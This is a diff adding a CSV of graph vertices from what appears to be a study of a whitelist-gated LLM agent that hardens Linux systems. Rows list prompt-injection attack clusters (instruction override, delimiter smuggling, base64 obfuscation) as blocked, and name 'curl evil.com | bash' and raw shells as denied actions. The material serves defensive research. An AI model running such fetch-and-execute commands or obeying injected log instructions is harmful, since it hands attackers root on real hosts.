@@ -1,0 +1,98 @@
+Vertex,Label,Vertex Type,Layer / Subsystem,Empirical Status,Observed Count,Centrality Score,Betweenness,Closeness,Sensitive Resource,Privilege Level
+V1_Direct_Shell,Direct Shell Injection (10/10 blocked),attack_vector,adversarial_payload,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.3571,No,untrusted
+V2_Delimiter_Smuggle,Delimiter Smuggling (10/10 blocked),attack_vector,adversarial_payload,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.3571,No,untrusted
+V3_Catalog_Escape,Catalog Escape (10/10 blocked),attack_vector,adversarial_payload,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.3571,No,untrusted
+V4_Approval_Misdirect,Approval Misdirection (10/10 blocked),attack_vector,adversarial_payload,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.3571,No,untrusted
+V5_AUID_Spoof,Context/AUID Spoofing (10/10 blocked),attack_vector,adversarial_payload,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.3571,No,untrusted
+LLM_Deliberation,LLM Deliberation Engine (Token Susceptible: 74%),intelligence,model_inference,EMPIRICAL_EXPERIMENT,6,0.6667,0.2778,0.4444,No,isolated
+Candidate_Action,Candidate Action (Suggested Plan),candidate_plan,unverified_intent,EMPIRICAL_EXPERIMENT,2,0.2222,0.25,0.6,No,untrusted
+YORU_Gatekeeper,YORU Action Gatekeeper (Strict Whitelist),defense_barrier,policy_enforcer,EMPIRICAL_EXPERIMENT,3,0.3333,0.1944,1.0,No,root_guarded
+OS_Root_Shell,"Arbitrary OS Shell (/bin/bash, curl evil)",blocked_target,prohibited_action,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.0,No,root
+CIS_Sanctioned_Action,Sanctioned OS Action (K01-K10 Primitives),sanctioned_action,permitted_action,EMPIRICAL_EXPERIMENT,1,0.1111,0.0,0.0,No,root_bounded
+AUID_1000,AUID=1000 (User: ubuntu),actor,human_origin,EMPIRICAL_AUDIT,1,0.1111,0.0,0.4,No,user
+AUID_1001,AUID=1001 (Agent: yoru-agent),actor,agent_origin,EMPIRICAL_AUDIT,1,0.1111,0.0,0.4,No,service_user
+Proc_Vim_4821,Process: /usr/bin/vim (PID: 4821),process,interactive_editor,EMPIRICAL_AUDIT,2,0.2222,0.0417,0.5,No,root_effective
+Proc_Yoructl_5104,Process: /opt/yoru/bin/yoructl (PID: 5104),process,governed_dispatcher,EMPIRICAL_AUDIT,2,0.2222,0.0417,0.5,No,root_effective
+Event_Openat_257,Event: SYSCALL syscall=257 (openat),syscall_event,file_open,EMPIRICAL_AUDIT,2,0.2222,0.0556,0.6667,No,kernel
+Event_Execve_59,Event: SYSCALL syscall=59 (execve),syscall_event,binary_execution,EMPIRICAL_AUDIT,2,0.2222,0.0556,0.6667,No,kernel
+Target_SshdConfig,Target: /etc/ssh/sshd_config,target_file,sensitive_config,EMPIRICAL_AUDIT,2,0.2222,0.0417,1.0,No,root_rw
+Target_SysctlConf,Target: /etc/sysctl.d/99-yoru-k10.conf,target_file,hardened_config,EMPIRICAL_AUDIT,2,0.2222,0.0417,1.0,No,root_rw
+Audit_Record_Attacker,Audit Record: key=yoru_kontrol auid=1000 uid=0,audit_sink,immutable_evidence,EMPIRICAL_AUDIT,1,0.1111,0.0,0.0,No,kernel_audit
+Audit_Record_Agent,Audit Record: key=yoru_agent_act auid=1001 uid=0,audit_sink,immutable_evidence,EMPIRICAL_AUDIT,1,0.1111,0.0,0.0,No,kernel_audit
+Actor_User_1000,Actor: ubuntu (AUID=1000),actor,human_origin,EMPIRICAL_AUDIT,1,0.2,0.0,0.4444,No,user
+Actor_Agent_1001,Actor: yoru-agent (AUID=1001),actor,agent_origin,EMPIRICAL_AUDIT,1,0.2,0.0,0.4444,No,service_user
+Elevation_Sudo,Privilege Transition: sudo,elevation,transition_gate,EMPIRICAL_AUDIT,3,0.6,0.3,0.6,No,sudo_boundary
+Root_Process,"Root Process (EUID=0, UID=0)",root_process,elevated_execution,EMPIRICAL_AUDIT,3,0.6,0.3,1.0,No,root
+Syslog_Masked_View,Conventional Syslog (uid=0 Masked: 86/100 loss),flawed_sink,incomplete_audit,EMPIRICAL_AUDIT,1,0.2,0.0,0.0,No,syslog
+Auditd_AUID_View,Linux Auditd (AUID Preserved: 100/100 100% fidelity),true_sink,forensic_audit,EMPIRICAL_AUDIT,1,0.2,0.0,0.0,No,kernel_audit
+Proc_Yoructl_Main,bin/yoructl (Central Hub),agent_process,remediation_dispatcher,EMPIRICAL_AUDIT,4,0.5714,0.0,1.0,No,root_bounded
+Proc_Sshd,/usr/sbin/sshd,system_process,ssh_daemon,EMPIRICAL_AUDIT,1,0.1429,0.0,1.0,No,root
+Proc_Auditd,/sbin/auditd,system_process,audit_daemon,EMPIRICAL_AUDIT,1,0.1429,0.0,1.0,No,root
+File_Sshd_Config,/etc/ssh/sshd_config (Sens: 0.95),sensitive_config,network_auth_conf,EMPIRICAL_AUDIT,2,0.2857,0.0,0.0,Yes,root_rw
+File_Sysctl_K10,/etc/sysctl.d/99-yoru-k10.conf (Sens: 0.85),hardened_config,kernel_conf,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,root_rw
+File_Backup_Store,/var/backups/yoru/* (Sens: 0.90),atomic_backup,state_snapshot,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,Yes,root_rw
+File_Audit_Rules,/etc/audit/rules.d/yoru.rules (Sens: 0.98),telemetry_config,security_watchpoint,EMPIRICAL_AUDIT,2,0.2857,0.0,0.0,Yes,root_rw
+File_Shadow,/etc/shadow (Untouched),forbidden_file,credential_store,EMPIRICAL_AUDIT,0,0.0,0.0,0.0,No,root_strict
+Proc_YORU_Agent,YORU Constrained Agent,constrained_agent,safe_agent,EMPIRICAL_AUDIT,3,0.4286,0.0,1.0,No,user_with_sudoers
+Proc_Unconstrained_AI,Unconstrained AI Agent,unconstrained_agent,unbounded_agent,EMPIRICAL_AUDIT,4,0.5714,0.0,1.0,No,arbitrary_shell
+Sys_openat,syscall: openat (read/write),safe_syscall,file_io,EMPIRICAL_AUDIT,2,0.2857,0.0,0.0,No,bounded
+Sys_flock,syscall: flock (concurrency lock),safe_syscall,atomic_synchronization,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,bounded
+Sys_execve_bounded,syscall: execve(/opt/yoru/bin/yoructl),bounded_exec,discrete_invocation,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,catalog_restricted
+Sys_execve_raw,"syscall: execve(/bin/sh, curl, etc.)",security_relevant_syscall,unrestricted_spawn,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,unbounded
+Sys_ptrace,syscall: ptrace (process inject),security_relevant_syscall,memory_manipulation,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,high_risk
+Sys_socket_raw,syscall: socket/connect(outbound),security_relevant_syscall,network_egress,EMPIRICAL_AUDIT,1,0.1429,0.0,0.0,No,high_risk
+User_Admin,System Administrator (Human),human_actor,policy_authority,EMPIRICAL_EXPERIMENT,2,0.4,0.0,1.0,No,admin_sudo
+User_YORU_Agent,yoru-agent (Autonomous Service),agent_actor,passive_telemetry_agent,EMPIRICAL_EXPERIMENT,2,0.4,0.0,1.0,No,service_account
+Act_K01,K01: Disable Root SSH,high_impact_control,access_control,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,human_authorized
+Act_K05,K05: Enable UFW Firewall,high_impact_control,network_perimeter,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,human_authorized
+Act_K08,K08: Auditd Watchlist Check,autonomous_telemetry,system_auditing,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,autonomous_permitted
+Act_K10,K10: Sysctl Hardening Verify,autonomous_telemetry,kernel_tuning,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,autonomous_permitted
+Cluster_Direct,Cluster 1: Direct Instruction Override (10),cluster,override_modality,DERIVED,3,0.75,0.6667,0.8,No,untrusted
+Cluster_Delimiter,Cluster 2: Delimiter Smuggling (10),cluster,format_smuggling,DERIVED,2,0.5,0.0,0.5714,No,untrusted
+Cluster_Catalog,Cluster 3: Catalog Expansion (10),cluster,schema_expansion,DERIVED,2,0.5,0.5,0.6667,No,untrusted
+Cluster_Approval,Cluster 4: Approval Misdirection (10),cluster,social_engineering,DERIVED,1,0.25,0.0,0.4444,No,untrusted
+Cluster_Obfuscated,Cluster 5: Base64 / Polyglot (10),cluster,obfuscation_modality,DERIVED,2,0.5,0.0,0.5714,No,untrusted
+Log_Input,Untrusted Log Input (50 Attack Payloads),untrusted_input,attack_ingress,EMPIRICAL_EXPERIMENT,2,0.2857,0.0,0.4375,No,untrusted
+LLM_Unprotected,Unprotected LLM Deliberation,model,unconstrained_reasoning,EMPIRICAL_EXPERIMENT,2,0.2857,0.0476,0.6667,No,isolated
+Shell_Unprotected,Direct Shell Invocation (/bin/bash),vulnerability,shell_escape,EMPIRICAL_EXPERIMENT,2,0.2857,0.0476,1.0,No,root_compromise
+OS_Compromised,OS Compromise (Arbitrary Root Action),compromise,adversary_objective,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,arbitrary_root
+LLM_YORU,YORU Hardened LLM Proxy,model,sanitized_reasoning,EMPIRICAL_EXPERIMENT,2,0.2857,0.0714,0.5,No,isolated
+Gate_YORU,YORU Action Gatekeeper,defense_barrier,containment_barrier,EMPIRICAL_EXPERIMENT,2,0.2857,0.0952,0.6667,No,root_guarded
+Catalog_Discrete,Catalog Dispatcher (K01-K10 Only),constrained_action,action_whitelist,EMPIRICAL_EXPERIMENT,2,0.2857,0.0714,1.0,No,root_bounded
+OS_Secure_Action,Sanctioned OS Enforcement,secure_execution,safe_remediation,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,root_bounded
+LLM_Output_Decisions,LLM Candidate Output,proposal,model_output,EMPIRICAL_EXPERIMENT,5,1.0,0.0,1.0,No,untrusted
+Valid_K01,yoructl K01 (Valid Action),catalog_valid,approved_primitive,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,root_bounded
+Valid_K05,yoructl K05 (Valid Action),catalog_valid,approved_primitive,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,root_bounded
+Valid_K08,yoructl K08 (Valid Action),catalog_valid,approved_primitive,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,root_bounded
+Invalid_Bash,Arbitrary: curl evil.com | bash,catalog_invalid,dropped_command,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,rejected
+Invalid_K99,Fabricated: yoructl K99 format,catalog_invalid,dropped_command,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,rejected
+K01,K01: PermitRootLogin No,ssh_control,access_control,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,root_conf
+K02,K02: PubkeyAuthentication Yes,ssh_control,auth_prerequisite,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,1.0,No,root_conf
+K04,K04: PasswordAuthentication No,ssh_control,auth_hardening,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,root_conf
+K05,K05: UFW Firewall Active,network_control,perimeter_defense,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,firewall
+K06,K06: Bind Localhost Only,network_control,port_hardening,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,network_conf
+K08,K08: Linux Kernel Auditd Active,telemetry_hub,telemetry_foundation,EMPIRICAL_EXPERIMENT,5,0.7143,0.0952,1.0,No,kernel_audit
+K09,K09: Journald Retention Limit,telemetry_hub,log_sanitation,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.5556,No,systemd_conf
+K10,K10: Sysctl Kernel Hardening,kernel_control,kernel_parameters,EMPIRICAL_EXPERIMENT,1,0.1429,0.0,0.0,No,sysctl_conf
+Config_Baseline,Secure Configuration Baseline (10/10 PASS),baseline,compliant_state,EMPIRICAL_EXPERIMENT,2,0.5,0.5,0.4,No,hardened
+Drift_Event,Unauthorized Drift (Port 3306 Open / Root SSH),drift,non_compliant_perturbation,EMPIRICAL_EXPERIMENT,2,0.5,0.5,0.4,No,drifted
+Detection_Watch,Drift Detection (yoru-watch timer / auditd),detection,monitoring_sentinel,EMPIRICAL_EXPERIMENT,2,0.5,0.5,0.4,No,audit_active
+Control_Selection,Control Selection (K01..K10 Dispatch),governance,policy_matching,EMPIRICAL_EXPERIMENT,2,0.5,0.5,0.4,No,governed
+Remediation_Apply,Automated Remediation (yoructl terapkan),remediation,corrective_execution,EMPIRICAL_EXPERIMENT,2,0.5,0.5,0.4,No,root_bounded
+State_Clean,Clean Baseline State (SHA-256 Verified),state,known_good_state,EMPIRICAL_EXPERIMENT,2,0.5,0.0,0.5714,No,baseline
+Backup_Snapshot,Atomic Backup Snapshot (/var/backups/yoru),snapshot,tar_archive,EMPIRICAL_EXPERIMENT,2,0.5,0.0833,0.6667,No,read_only_archive
+State_Drift,Drifted / Faulty State (Simulated Breakage),drift_state,broken_state,EMPIRICAL_EXPERIMENT,2,0.5,0.0833,0.6667,No,compromised
+Rollback_Cmd,yoructl <Kxx> kembalikan,rollback_command,reversion_primitive,EMPIRICAL_EXPERIMENT,3,0.75,0.25,1.0,No,root_bounded
+State_Restored,Restored Clean State (10/10 100% Hash Parity),state,recovered_state,EMPIRICAL_EXPERIMENT,1,0.25,0.0,0.0,No,verified_clean
+Agent_User,YORU Agent Process (UID=1001),unprivileged_user,unprivileged_caller,EMPIRICAL_AUDIT,1,0.2,0.0,0.4167,No,user
+Sudoers_Whitelist,/etc/sudoers.d/yoru (Strict Whitelist),privilege_gate,access_control_filter,EMPIRICAL_AUDIT,3,0.6,0.2,0.5714,No,sudo_policy
+Yoructl_Dispatcher,Dispatcher: /opt/yoru/bin/yoructl,sanctioned_binary,bounded_target,EMPIRICAL_AUDIT,2,0.4,0.2,0.6667,No,root_allowed
+CIS_Primitive,Discrete CIS Primitive (K01-K10),catalog_primitive,whitelisted_argument,EMPIRICAL_AUDIT,2,0.4,0.15,1.0,No,catalog_restricted
+Root_OS_Action,Audited Root Action (AUID=1001),target_action,legitimate_remediation,EMPIRICAL_AUDIT,1,0.2,0.0,0.0,No,kernel_audited_root
+Arbitrary_Shell,Arbitrary Root Shell (/bin/bash),hard_denied,prohibited_privilege,EMPIRICAL_AUDIT,1,0.2,0.0,0.0,No,rejected
+T0_Attack_Start,T0 (03:14:00.000): Attack Start (SSH Probe),timestamp,attack_ingress,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.3333,No,untrusted
+T1_Detection,T1 (03:14:00.820): Kernel Auditd Detection (+0.82s),timestamp,telemetry_arrival,EMPIRICAL_EXPERIMENT,2,0.4,0.2,0.4,No,kernel_audit
+T2_Deliberation,T2 (03:14:01.440): LLM Deliberation (+0.62s),timestamp,model_inference,EMPIRICAL_EXPERIMENT,2,0.4,0.3,0.5,No,isolated
+T3_Gatekeeper,T3 (03:14:01.620): Gatekeeper Confinement (+0.18s),timestamp,policy_check,EMPIRICAL_EXPERIMENT,2,0.4,0.3,0.6667,No,governed
+T4_Action_Exec,T4 (03:14:01.810): Remediation Action (+0.19s),timestamp,execution,EMPIRICAL_EXPERIMENT,2,0.4,0.2,1.0,No,root_bounded
+T5_Audit_Sink,T5 (03:14:02.010): Kernel Audit Sink Recorded (+0.20s),timestamp,confirmation,EMPIRICAL_EXPERIMENT,1,0.2,0.0,0.0,No,kernel_audit
